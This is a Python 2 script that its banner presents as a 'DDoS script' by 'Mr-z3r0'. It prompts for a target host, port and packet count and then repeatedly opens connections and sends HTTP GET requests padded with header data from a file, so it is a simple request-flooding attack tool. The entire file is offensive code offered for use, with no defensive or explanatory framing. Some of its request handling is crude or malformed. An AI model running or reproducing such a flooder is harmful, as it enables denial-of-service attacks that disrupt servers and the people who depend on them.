#!/usr/bin/env python2
import sys, os, socket, random, urllib2, time
from core.colors import white, green, end, red, yellow, back
os.system("clear")
host = " "
port = " "
packets = " "
uagent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"
def banner():
 print """%s
 \t /$$$$$$$  /$$           /$$$$$$$$                 
 \t| $$__  $$|__/          | $$_____/                 
 \t| $$  \ $$ /$$  /$$$$$$ | $$     /$$$$$$  /$$   /$$  
 \t| $$$$$$$ | $$ /$$__  $$| $$$$$ /$$__  $$|  $$ /$$/   
 \t| $$__  $$| $$| $$  \ $$| $$__/| $$  \ $$ \  $$$$/   
 \t| $$  \ $$| $$| $$  | $$| $$   | $$  | $$  >$$  $$ 
 \t| $$$$$$$/| $$|  $$$$$$$| $$   |  $$$$$$/ /$$/\  $$  
 \t|_______/ |__/ \____  $$|__/    \______/ |__/  \__/  
 \t               /$$  \ $$                           
 \t              |  $$$$$$/                           
 \t              \______/                            
 \t
 \t                 %s[*] %sDDoS script %s[*]
 \t              %s[*] %sDeveloper :%sMr-z3r0 %s[*] 
 %s"""%(green, red, yellow, red, red, white, yellow, red, end)

def main():
 global host, port, packets
 host = raw_input("Host >> ")
 port =  int(input("Port >> "))
 packets = input("Packets >> ")
 def attack(host, port, packets):
  try:
   packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+uagent+"\n"+data).encode('utf-8')
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((host, port))  
   s.send(">> GET /" +  host)
   s.send("Host: " + host  + "\r\n\r\n")  
   if s.sendto( packet,(host, port)):
    s.shutdown(1)
    print "\033[93m[*] Send Package [*] \033[0m"
   else:
    s.shutdown(1)
    print("\033[91mshut<->down\033[0m")
   time.sleep(.1)
  except socket.error as e:
   print "\033[91mcheck server ip and port\033[0m"
 for i in range(0,packets):
  attack(host, port, packets)
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
def control():
 try:
  banner()
  main ()
 except KeyboardInterrupt:
  print "%s[!] %sCtrl + C%s"%(yellow, red, end)
  time.sleep(2)
  sys.exit()
if __name__ == "__main__":
 control()
